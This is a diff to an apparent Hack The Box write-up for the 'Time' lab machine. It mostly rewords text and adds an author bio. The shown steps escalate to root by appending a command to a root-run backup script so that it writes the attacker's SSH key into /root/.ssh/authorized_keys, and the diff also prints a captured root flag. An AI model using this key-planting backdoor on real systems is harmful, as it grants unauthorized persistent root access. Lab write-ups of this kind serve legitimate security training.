@@ -102,7 +102,7 @@ We can see that root has been accessing this file: “/usr/bin/timer_backup.sh�
 
 ![ak](https://media.discordapp.net/attachments/490431433559506954/832944544067878932/unknown.png)
 
-You need to create your ssh key, and you need to replace your ssh publickey to /root/.ssh/authorized_keys” >> /usr/bin/timer_backup.sh to do this follow commands :
+You need to create your ssh key, add our SSH public key to the authorized_keys file on the server. To do this follow commands :
 
 ```sh
 ssh-keygen
@@ -111,7 +111,7 @@ Copy your id_rsa.pub key
 and paste this command in target machine : echo "echo id_rsa.pub >> /root/.ssh/authorized_keys" >> /usr/bin/timer_backup.sh
 ```
 
-Now : ```chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214```
+Now just : ```chmod 600 id_rsa && ssh -i id_rsa root@10.10.10.214```
 
 Done ! 
 
@@ -128,7 +128,15 @@ Got the root flag
 root@time:~# cat /root/root.txt
 adsd9hf0c86b8786477033415e3018a4
 ```
-## {0x4} Summary Of Knowledge : 
+## Summary Of Knowledge : 
 
 - Java Deserialization
 - System Timer Exploitation
+
+## About me :
+
+- Post author : x0ld
+- Github : https://github.com/x0ld
+- Twitter : @x0ld7
+- HTB : ![ak](https://www.hackthebox.eu/badge/image/491690)
+
